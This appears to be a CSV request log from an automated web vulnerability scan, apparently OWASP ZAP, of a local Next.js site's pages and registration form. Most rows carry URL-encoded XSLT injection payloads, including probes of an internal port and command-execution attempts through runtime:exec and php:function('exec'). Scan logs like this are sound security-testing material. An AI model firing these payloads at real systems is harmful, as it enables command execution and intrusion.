ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
2600,Fri Sep 25 14:42:12 IST 2026,Fri Sep 25 14:42:12 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,130,345,11938274
2601,Fri Sep 25 14:42:12 IST 2026,Fri Sep 25 14:42:12 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,4,327,71262
2602,Fri Sep 25 14:42:13 IST 2026,Fri Sep 25 14:42:13 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,4,327,71262
2603,Fri Sep 25 14:42:12 IST 2026,Fri Sep 25 14:42:12 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,21,342,142828
2604,Fri Sep 25 14:42:12 IST 2026,Fri Sep 25 14:42:12 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,101,Switching Protocols,20,129,0
2605,Fri Sep 25 14:42:12 IST 2026,Fri Sep 25 14:42:12 IST 2026,GET,http://localhost:3000/about?_rsc=%3C,200,OK,42,303,3854
2606,Fri Sep 25 14:42:13 IST 2026,Fri Sep 25 14:42:13 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,6,342,142828
2607,Fri Sep 25 14:42:13 IST 2026,Fri Sep 25 14:42:13 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,69,345,11938274
2608,Fri Sep 25 14:42:13 IST 2026,Fri Sep 25 14:42:13 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=system-property%28%27xsl%3Avendor%27%29%2F%3E,101,Switching Protocols,2,129,0
2609,Fri Sep 25 14:42:13 IST 2026,Fri Sep 25 14:42:13 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,4,327,71262
2610,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,5,327,71262
2611,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,101,Switching Protocols,2,129,0
2612,Fri Sep 25 14:42:13 IST 2026,Fri Sep 25 14:42:13 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,4,342,142828
2613,Fri Sep 25 14:42:13 IST 2026,Fri Sep 25 14:42:13 IST 2026,GET,http://localhost:3000/about?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,47,303,3854
2614,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,51,345,11938274
2615,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,9,327,71262
2616,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,101,Switching Protocols,2,129,0
2617,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/about?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,44,303,3854
2618,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/about?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,32,303,3854
2619,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,101,Switching Protocols,1,129,0
2620,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/about?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,39,303,3854
2621,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,101,Switching Protocols,2,129,0
2622,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,101,Switching Protocols,22,129,0
2623,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/contact?_rsc=%3C,200,OK,75,303,3866
2624,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/about?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,56,303,3854
2625,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/contact?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,52,303,3866
2626,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/about?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,43,303,3854
2627,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/faq?_rsc=%3C,200,OK,88,303,3842
2628,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/contact?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,149,303,3866
2629,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/about?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,154,303,3854
2630,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%3C,200,OK,206,315,25931
2631,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/faq?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,244,303,3842
2632,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/contact?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,201,303,3866
2633,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/faq?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,130,303,3842
2634,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,246,315,25931
2635,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/contact?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,149,303,3866
2636,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/images,404,Not Found,520,341,9946
2637,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,822,345,11938274
2638,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,128,315,25931
2639,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/contact?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,67,303,3866
2640,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/faq?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,89,303,3842
2642,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,105,315,25931
2641,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/faq?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,154,303,3842
2643,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/contact?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,94,303,3866
2644,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/faq?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,56,303,3842
2645,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/contact?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,116,303,3866
2646,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,113,315,25931
2647,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/faq?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,97,303,3842
2648,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/login?_rsc=%3C,200,OK,121,303,3854
2649,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/faq?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,160,303,3842
2650,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,152,303,3854
2651,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,231,315,25931
2652,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/register?confirmPassword=%3C&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,278,335,18877
2653,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/login?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,61,303,3854
2654,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,54,315,25931
2655,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/login?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,89,303,3854
2656,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/register?confirmPassword=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,136,335,19157
2657,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,36,303,3854
2658,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,116,315,25931
2659,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,86,303,3854
2660,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/register?confirmPassword=system-property%28%27xsl%3Avendor%27%29%2F%3E&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,122,335,19013
2661,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/login?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,35,303,3854
2662,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,29,303,3854
2663,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/register?confirmPassword=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,95,335,19233
2664,Fri Sep 25 14:42:18 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/register?confirmPassword=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,54,335,19189
2665,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,818,345,11938274
2666,Fri Sep 25 14:42:18 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/register?confirmPassword=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,62,335,19177
2667,Fri Sep 25 14:42:18 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/register?confirmPassword=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,81,335,20295
2668,Fri Sep 25 14:42:18 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/register?confirmPassword=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,69,335,19279
2669,Fri Sep 25 14:42:18 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=%3C&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,73,335,18809
2670,Fri Sep 25 14:42:18 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,51,335,19089
2671,Fri Sep 25 14:42:18 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=system-property%28%27xsl%3Avendor%27%29%2F%3E&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,53,335,18945
2672,Fri Sep 25 14:42:18 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,59,335,19165
2673,Fri Sep 25 14:42:18 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,517,345,11938274
2674,Fri Sep 25 14:42:19 IST 2026,Fri Sep 25 14:42:19 IST 2026,GET,http://localhost:3000,200,OK,77,533,27949
2675,Fri Sep 25 14:42:19 IST 2026,Fri Sep 25 14:42:19 IST 2026,GET,http://localhost:3000/__nextjs_font,404,Not Found,54,341,9953
2676,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next,404,Not Found,58,341,9945
2677,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static,404,Not Found,59,341,9956
2678,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/chunks,404,Not Found,7,265,9
2679,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/chunks/app,404,Not Found,6,265,9
2680,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/about,404,Not Found,6,265,9
2681,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/contact,404,Not Found,6,265,9
2682,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/faq,404,Not Found,5,265,9
2683,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/login,404,Not Found,6,265,9
2684,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/register,404,Not Found,6,265,9
2685,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/css,404,Not Found,32,265,9
2686,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/css/app,404,Not Found,5,265,9
2687,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/media,404,Not Found,6,265,9
2688,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/images,404,Not Found,56,341,9946
2689,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:21 IST 2026,GET,http://localhost:3000,200,OK,91,533,27949
2690,Fri Sep 25 14:42:21 IST 2026,Fri Sep 25 14:42:21 IST 2026,GET,http://localhost:3000/__nextjs_font,404,Not Found,43,341,9953
2691,Fri Sep 25 14:42:21 IST 2026,Fri Sep 25 14:42:21 IST 2026,GET,http://localhost:3000/_next,404,Not Found,62,341,9945
